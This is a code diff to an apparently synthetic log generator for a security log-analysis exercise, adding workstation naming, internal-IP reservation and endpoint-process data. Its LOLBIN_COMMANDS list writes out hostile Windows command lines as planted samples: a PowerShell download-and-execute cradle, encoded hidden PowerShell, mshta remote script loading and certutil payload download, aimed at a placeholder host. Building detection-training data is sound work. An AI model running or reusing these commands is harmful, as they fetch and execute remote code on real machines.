@@ -25,8 +25,15 @@ HOSTNAME_POOL = {
     "bastion": ["bastion01", "bastion02"],
     "fw": ["fw-edge01", "fw-core01"],
     "dns": ["dns-int01", "dns-int02"],
-    "wkstn": ["wkstn-fin-07", "wkstn-hr-03", "wkstn-eng-14", "wkstn-eng-22", "wkstn-ops-05"],
 }
+
+# Workstations are per-EMPLOYEE, not shared infrastructure -- unlike the roles above
+# (a random subset of named boxes, each getting its own fresh IP via host_ips), every
+# human user gets exactly one, and it shares that user's existing internal IP
+# (ctx.user_ips) rather than a separate one, since it's the same physical machine an
+# auth.log login and an endpoint.log process both originate from. See Ctx.user_workstation.
+WKSTN_DEPTS = ["eng", "fin", "hr", "ops", "sales", "legal", "support", "it", "mktg", "design"]
+WORKSTATION_NAMES = [f"wkstn-{dept}-{i:02d}" for dept in WKSTN_DEPTS for i in range(1, 5)]
 
 CORP_DOMAINS = ["northfield-logistics.local", "brightpeak-retail.local", "vanguard-analytics.local",
                 "harbor-financial.local", "meridian-health.local"]
@@ -93,6 +100,36 @@ SUDO_COMMANDS_ABUSE = [
 EXFIL_PATHS = ["/export/full_customer_dump.csv", "/backup/db_snapshot_2026.sql.gz",
                "/reports/finance_q3_all_accounts.zip", "/api/v1/admin/export?table=all"]
 
+# workstation endpoint.log data -- benign (parent, child, cmdline_template) process trees
+# for noise, plus the phishing-lure filenames and LOLBins the malware archetype plants.
+# cmdline_template gets .format(u=username) where it references the user.
+BENIGN_PROC_CHAINS = [
+    ("explorer.exe", "chrome.exe", "chrome.exe"),
+    ("explorer.exe", "outlook.exe", "outlook.exe /recycle"),
+    ("explorer.exe", "teams.exe", "teams.exe --processStart Teams.exe"),
+    ("explorer.exe", "slack.exe", "slack.exe --process-start-args"),
+    ("explorer.exe", "excel.exe", "excel.exe C:\\Users\\{u}\\Documents\\Q3_report.xlsx"),
+    ("services.exe", "svchost.exe", "svchost.exe -k netsvcs"),
+    ("chrome.exe", "chrome.exe", "chrome.exe --type=renderer"),
+    ("explorer.exe", "onedrive.exe", "onedrive.exe /background"),
+    ("services.exe", "msmpeng.exe", "MsMpEng.exe"),
+    ("explorer.exe", "notepad.exe", "notepad.exe C:\\Users\\{u}\\Desktop\\notes.txt"),
+    ("explorer.exe", "zoom.exe", "\"C:\\Program Files (x86)\\Zoom\\bin\\Zoom.exe\""),
+]
+
+PHISHING_LURES = [
+    "invoice_march_2026.pdf.exe", "Q3_bonus_details.doc.exe", "shipping_label.pdf.exe",
+    "annual_review_form.docx.exe", "remote_support_tool.pdf.exe", "compensation_review.xls.exe",
+]
+
+LOLBIN_COMMANDS = [
+    ("powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
+    ("powershell.exe", "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://x')"),
+    ("mshta.exe", "mshta.exe javascript:GetObject('script:http://x/a.sct').Exec()"),
+    ("cmd.exe", "cmd.exe /c certutil -urlcache -split -f http://x/p.exe %temp%\\p.exe"),
+    ("wscript.exe", "wscript.exe //B //nologo C:\\Users\\Public\\update.vbs"),
+]
+
 HEX_CHARS = "0123456789abcdef"
 
 def rand_hex(rng, n):
@@ -130,7 +167,11 @@ class Ctx:
         # string hash randomization and silently break --seed reproducibility across runs.
         # Dedupe on the RENDERED username, not the (first, last) pair: two different pairs
         # (e.g. john+smith and jane+smith) can render to the same "jsmith" string.
-        n_users = rng.randint(8, 14)
+        # insane stacks up to 7 archetypes at once, several of which each reserve their own
+        # protagonist username (password_spraying alone can claim up to 10) -- a small pool
+        # would force the reservation fallback to silently double up two archetypes on the
+        # same username, bleeding their events together under a username-only grep filter.
+        n_users = rng.randint(14, 20) if difficulty == "insane" else rng.randint(8, 14)
         self.users = []
         seen = set()
         while len(self.users) < n_users:
@@ -146,11 +187,40 @@ class Ctx:
         days_ago = rng.randint(3, 30)
         base_day = datetime(2026, 9, 17) - timedelta(days=days_ago)
         self.start = base_day.replace(hour=rng.randint(0, 4), minute=rng.randint(0, 59), second=0)
-        span_hours = {"easy": 30, "medium": 42, "hard": 60}[difficulty]
+        span_hours = {"easy": 30, "medium": 42, "hard": 60, "insane": 90}[difficulty]
         self.end = self.start + timedelta(hours=span_hours)
 
-        # internal workstation IPs, per accessible account
-        self.user_ips = {u: rand_internal_ip(rng, self.internal_octet) for u in self.all_local_accounts}
+        # every internal (10.x) IP handed out this run -- to a user, a host, or an archetype's
+        # own internal actor (infected host, DNS tunneling client, port-scan target...) --
+        # goes through unique_internal_ip(), and noise generators draw internal addresses
+        # through safe_noise_internal_ip(), so background traffic can never coincidentally
+        # land on the same address as a planted actor. The internal address space is only
+        # ~2490 addresses (10.octet.0-9.2-250), small enough that with thousands of noise
+        # events this collision is *likely*, not a rare edge case, without this guard.
+        self.reserved_internal_ips = set()
+
+        # internal workstation IPs, per accessible account, AND per infrastructure host.
+        # Both draw from the same reservation -- questions like insider_after_hours Q2
+        # ("which username owns this IP") and the lateral-pivot chain's firewall
+        # corroboration ("which host initiated this connection") do reverse lookups that
+        # silently become ambiguous if two different accounts/hosts ever landed on the
+        # identical internal address.
+        self.user_ips = {u: self.unique_internal_ip() for u in self.all_local_accounts}
+        self.host_ips = {h: self.unique_internal_ip()
+                          for role_hosts in self.hosts.values() for h in role_hosts}
+
+        # one workstation hostname per human user (service accounts don't have desks) --
+        # shares that user's user_ips address rather than getting its own, since an
+        # auth.log login and an endpoint.log process from the same person are the same
+        # physical machine. This is what lets a question correlate "whose IP is this" in
+        # auth.log/access.log against "which named workstation is this" in endpoint.log.
+        self.user_workstation = dict(zip(self.users, rng.sample(WORKSTATION_NAMES, k=len(self.users))))
+
+        # a legit-but-regex-heavy cmdline (parentheses, backslashes, dots -- matches the
+        # "zoom.exe" entry in BENIGN_PROC_CHAINS) that shows up naturally in ordinary
+        # endpoint.log noise -- the endpoint.log analogue of canary_scanner_ua below, for
+        # guaranteed -F practice against a workstation log specifically
+        self.canary_endpoint_cmdline = "\"C:\\Program Files (x86)\\Zoom\\bin\\Zoom.exe\""
 
         # every public IP handed out this run goes through unique_public_ip() so noise traffic
         # can never coincidentally collide with an archetype's planted attacker/C2/exfil IP
@@ -160,6 +230,10 @@ class Ctx:
         # usernames "reserved" by an archetype as its protagonist -- noise generators skip these
         # so a random benign login/sudo line never gets mixed into a username-only grep filter
         self.reserved_users = set()
+
+        # EXFIL_PATHS choices reserved so two different archetypes never plant activity
+        # under the identical sensitive path (see pick_exfil_path)
+        self.reserved_paths = set()
 
         self.canary_scanner_ua = rng.choice(UA_TOOLING)
 
@@ -182,6 +256,26 @@ class Ctx:
         ip = rand_public_ip(self.rng)
         while ip in self.reserved_ips:
             ip = rand_public_ip(self.rng)
+        return ip
+
+    def unique_internal_ip(self):
+        """For a user, a host, or an archetype's own internal actor (infected host, DNS
+        tunneling client, port-scan target...). See reserved_internal_ips for why this
+        matters -- the internal address space is small enough that collisions with noise
+        are likely without reserving every planted address."""
+        ip = rand_internal_ip(self.rng, self.internal_octet)
+        while ip in self.reserved_internal_ips:
+            ip = rand_internal_ip(self.rng, self.internal_octet)
+        self.reserved_internal_ips.add(ip)
+        return ip
+
+    def safe_noise_internal_ip(self):
+        """An internal IP for generic noise that just needs to dodge reserved addresses
+        (repeats across noise lines are fine and realistic; only collision with a planted
+        actor's address matters)."""
+        ip = rand_internal_ip(self.rng, self.internal_octet)
+        while ip in self.reserved_internal_ips:
+            ip = rand_internal_ip(self.rng, self.internal_octet)
         return ip
 
     def noise_user(self, rng=None):
@@ -211,6 +305,16 @@ class Ctx:
         chosen = self.rng.sample(pool or self.users, k=max(k, 1))
         self.reserved_users.update(chosen)
         return chosen
+
+    def pick_exfil_path(self):
+        """data_exfiltration and insider_after_hours both draw from EXFIL_PATHS and both
+        can land in the same after-hours window -- reserving the choice keeps them from
+        picking the identical path, which would make 'which IP is doing this?' ambiguous
+        between the two archetypes' IPs."""
+        pool = [p for p in EXFIL_PATHS if p not in self.reserved_paths]
+        p = self.rng.choice(pool or EXFIL_PATHS)
+        self.reserved_paths.add(p)
+        return p
 
     def new_attacker_ip(self, used):
         ip = self.unique_public_ip()
